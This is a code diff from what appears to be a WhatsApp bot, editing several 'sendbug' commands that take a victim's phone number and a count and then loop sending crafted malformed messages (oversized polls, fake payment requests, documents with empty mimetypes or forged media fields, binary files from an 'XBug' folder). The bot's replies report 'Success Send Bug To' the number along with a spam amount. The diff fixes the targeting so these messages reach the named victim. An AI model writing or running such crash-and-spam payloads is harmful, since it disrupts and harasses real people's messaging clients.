@@ -621,7 +621,7 @@ let bwa = q.split('|')[0]
 let jumlah = q.split('|')[1]
 if (jumlah >= 5) return reply(`spam`)
 for (let i = 0; i < jumlah; i++) {
-var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+var pollCreation = generateWAMessageFromContent(`${bwa}@s.whatsapp.net`, proto.Message.fromObject({
 "pollCreationMessage": {
 "name": botname,
 "options": [
@@ -643,8 +643,8 @@ var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject
 ],
 "selectableOptionsCount": 5
 	}
-}), { userJid: bwa, quoted: doc })}
-XeonBotInc.relayMessage(bwa, pollCreation.message, { messageId: pollCreation.key.id })
+}), { userJid: `${bwa}@s.whatsapp.net`, quoted: doc })}
+XeonBotInc.relayMessage(`${bwa}@s.whatsapp.net`, pollCreation.message, { messageId: pollCreation.key.id })
 deploy('Successful sendbug')
 }
 break
@@ -667,15 +667,15 @@ if (jumlah >= 5) return reply(`spam`)
 for (let i = 0; i < jumlah; i++) {
 m.reply(`Okay sir!`)
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./XBug/xpic.jpeg') }, { upload: XeonBotInc.waUploadToServer })
-var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
+var requestPaymentMessage = generateWAMessageFromContent(`${bwa}@s.whatsapp.net`, proto.Message.fromObject({
 "requestPaymentMessage": {
 "currencyCodeIso4217": "IDR",
 "amount1000": "100",
 "extendedTextMessage": {
 "text": botname,
 }
-}}), { userJid: num, quoted: doc})
-XeonBotInc.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
+}}), { userJid: `${bwa}@s.whatsapp.net`, quoted: doc})
+XeonBotInc.relayMessage(`${bwa}@s.whatsapp.net`, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
 }
 m.reply(`Success Sending Bug To: ${num}\nAmount Spam: ${jumlah}`)
 }
@@ -688,15 +688,15 @@ jumlah = q.split('|')[1]
 for (let i = 0; i < jumlah; i++) {
 m.reply(`Okay sir`)
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./XBug/xpic.jpeg') }, { upload: XeonBotInc.waUploadToServer })
-var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
+var requestPaymentMessage = generateWAMessageFromContent(`${bwa}@s.whatsapp.net`, proto.Message.fromObject({
 "requestPaymentMessage": {
 "currencyCodeIso4217": "IDR",
 "amount1000": "100",
 "extendedTextMessage": {
 "text": `MY DEVELOPER HW MODS WA`,
 }
-}}), { userJid: m.chat, quoted: doc})
-XeonBotInc.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
+}}), { userJid: `${bwa}@s.whatsapp.net`, quoted: doc})
+XeonBotInc.relayMessage(`${bwa}@s.whatsapp.net`, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
 }
 m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
 }
@@ -708,7 +708,7 @@ let jumlah = q.split('|')[1]
 if (jumlah >= 5) return reply(`spam`)
 for (let i = 0; i < jumlah; i++) {
 lodaChoos = fs.readFileSync('./XBug/randiKaBaccha.sound')
-XeonBotInc.sendMessage(bwa, {document: lodaChoos, mimetype: 'application/octet-stream', fileName:`${botname} ${xeonbut2}.sound` }, {quoted:doc})
+XeonBotInc.sendMessage(`${bwa}@s.whatsapp.net`, {document: lodaChoos, mimetype: 'application/octet-stream', fileName:`${botname} ${xeonbut2}.sound` }, {quoted:doc})
 }
 m.reply(`Success Send Bug To: ${bwa}\nAmount Spam: ${jumlah}`)
 
@@ -721,7 +721,7 @@ let jumlah = q.split('|')[1]
 if (jumlah >= 5) return reply(`spam`)
 for (let i = 0; i < jumlah; i++) {
  lodaChoos2 = fs.readFileSync('./XBug/randiKaBaccha.sound')
- XeonBotInc.sendMessage(bwa, {document: lodaChoos2, mimetype: '', fileName:`${botname} ${xeonbut2}.sound` }, {quoted:doc})
+ XeonBotInc.sendMessage(`${bwa}@s.whatsapp.net`, {document: lodaChoos2, mimetype: '', fileName:`${botname} ${xeonbut2}.sound` }, {quoted:doc})
  }
  m.reply(`Success Send Bug To: ${bwa}\nAmount Spam: ${jumlah}`)
 
@@ -733,7 +733,7 @@ let bwa = q.split('|')[0]
 let jumlah = q.split('|')[1]
 if (jumlah >= 5) return reply(`spam`)
 for (let i = 0; i < jumlah; i++) {
-var document = generateWAMessageFromContent(bwa, proto.Message.fromObject({	
+var document = generateWAMessageFromContent(`${bwa}@s.whatsapp.net`, proto.Message.fromObject({	
 "documentMessage": {
 "url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
 "mimetype": "",
@@ -746,8 +746,8 @@ var document = generateWAMessageFromContent(bwa, proto.Message.fromObject({
 "directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
 "mediaKeyTimestamp": "1658703206",
 }
-}), { userJid: bwa })
-XeonBotInc.relayMessage(bwa, document.message, { messageId: document.key.id })
+}), { userJid: `${bwa}@s.whatsapp.net` })
+XeonBotInc.relayMessage(`${bwa}@s.whatsapp.net`, document.message, { messageId: document.key.id })
 }
 m.reply(`Success Send Bug To: ${bwa}\nAmount Spam: ${jumlah}`)
 
